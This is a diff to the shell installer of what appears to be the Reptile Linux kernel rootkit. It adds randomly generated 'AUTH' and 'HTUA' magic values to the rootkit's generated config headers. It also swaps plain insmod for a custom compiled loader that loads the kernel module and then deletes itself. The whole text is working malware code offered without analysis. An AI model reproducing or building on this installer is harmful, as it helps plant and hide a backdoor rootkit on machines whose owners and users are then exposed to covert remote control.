@@ -179,6 +179,8 @@ EOF
 	START="/"$MODULE"/"$MODULE"_start"
 	TAGIN="#<$TAG>"
 	TAGOUT="#</$TAG>"
+	AUTH=0x$(openssl rand -hex 4)
+	HTUA=0x$(openssl rand -hex 4)
 
 	cat > config.script <<EOF
 #ifndef _CONFIG_H
@@ -194,6 +196,8 @@ EOF
 #define PATH        "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define WORKQUEUE	"ata/0"
 #define SRCPORT 	$SRCPORT
+#define AUTH		$AUTH
+#define HTUA		$HTUA
 
 #endif
 EOF
@@ -218,6 +222,8 @@ EOF
 #define OUT 		5
 #define EXIT_LEN 	16
 #define EXIT 		";7(Zu9YTsA7qQ#vw"
+#define AUTH		$AUTH
+#define HTUA		$HTUA
 
 #endif
 EOF
@@ -264,8 +270,12 @@ function reptile_install {
     #	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     fi
 
-	depmod && insmod /$MODULE/$MODULE.ko > /dev/null 2>&1
+	gcc loader.c -o loader
+	depmod && \
+	#insmod /$MODULE/$MODULE.ko > /dev/null 2>&1 
+	./loader /$MODULE/$MODULE.ko && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	rm -f loader
 
 	directory_remove
 	echo -e "\nInstalation has finished!\n"
